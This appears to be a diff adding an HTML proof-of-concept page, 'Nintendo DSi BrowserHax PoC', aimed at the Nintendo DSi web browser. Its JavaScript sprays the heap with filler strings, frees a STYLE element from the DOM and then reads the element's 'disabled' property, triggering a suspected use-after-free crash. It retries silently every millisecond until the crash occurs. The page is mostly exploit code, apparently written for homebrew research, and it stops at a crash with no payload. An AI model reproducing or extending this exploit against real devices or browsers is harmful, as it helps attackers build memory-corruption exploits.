@@ -1,0 +1,120 @@
+
+<html>
+<head>
+<meta http-equiv="refresh">
+</head>
+<body>
+
+<h3>Nintendo DSi BrowserHax PoC</h3>
+<hr>
+
+<blink>Exploit in progress...</blink>
+<div id="sandbox"></div>
+
+<script>
+
+var cur_obj;			// Reference to currently tested object
+var out_div;			// Top-level sandbox in which cur_obj is created
+var cur_tag;			// Name of cur_obj tag
+
+var spray_str;
+
+/* Try to spray the memory with known strings to make fun crashes more visible */
+function heap_spray() {
+
+  if (!spray_str) {
+    var spray_str = "AAAAAAAA";
+	/* TODO: TWEAK for DSi */
+    for (var i=0;i<12;i++) spray_str += spray_str; 
+  }
+
+  window.name = Math.random() + spray_str + Math.random();
+  eval("window.name=''");
+
+}
+
+//Important for exploit stability, 10-100ms are okay
+function sleep() {
+  setTimeout(function () {
+     return;
+  }, 100);
+}
+
+/* Log an event. */
+function log(message) {
+
+  //console.log(message);
+  sleep();
+  return;
+	
+  /*
+  var stateTemp = "NaN";
+  var request = new XMLHttpRequest();
+  request.open("GET", "debug.php?state=" + stateTemp + "&message=" + message, false);
+  request.send();
+  */
+}
+
+/* Main browserhax function */
+function dsihax() {
+
+/*********************************************/
+/* PHASE 0: Create new HTML tag in a sandbox */
+/*********************************************/
+
+	log('+++ Phase 0: initialization +++');
+
+	try { 
+		out_div.removeChild(cur_obj); 
+		log('Previous object removed OK.');
+	} catch (e) {
+		log('Failed to remove previously used object.');
+	}
+
+	cur_tag = "STYLE";
+	log('Picked target tag: <' + cur_tag + '>');
+
+	cur_obj = document.createElement(cur_tag);
+	out_div.appendChild(cur_obj);
+
+	cur_obj.innerHTML = 'Hello world'; 
+	log('Populated object with sample HTML.');
+	cur_obj.value = 'Hello world'; 
+	log('Populated object with sample value.');
+	  
+	log('+++ Phase 1: discarding object +++');
+
+      heap_spray();
+
+          log('Trying to delete child node via DOM...');
+          try {
+            out_div.removeChild(cur_obj);
+            log('...success.');
+          } catch (e) {
+            log('...received exception (' + e + ')');
+          }
+
+      heap_spray();
+	  
+      if (cur_obj) {
+        log('+++ Phase 2: read objects "disabled" property value +++');
+		log('+++ This should crash the DSi. Retry when not... +++');
+
+		// read object disabled property, will crash the DSi, because use-after-free?
+		// sometimes returns randomly true/false or just crashes
+		var checkProp = cur_obj.disabled;
+		log('+++ property value is: ' + checkProp + ' +++');
+      }
+
+}
+
+  heap_spray();
+
+  out_div  = document.getElementById('sandbox');
+  out_div.innerHTML = '';
+
+  //Silent Retry until it works...
+  setInterval('try { dsihax() } catch (e) { location.reload(); }',1);
+
+</script>
+
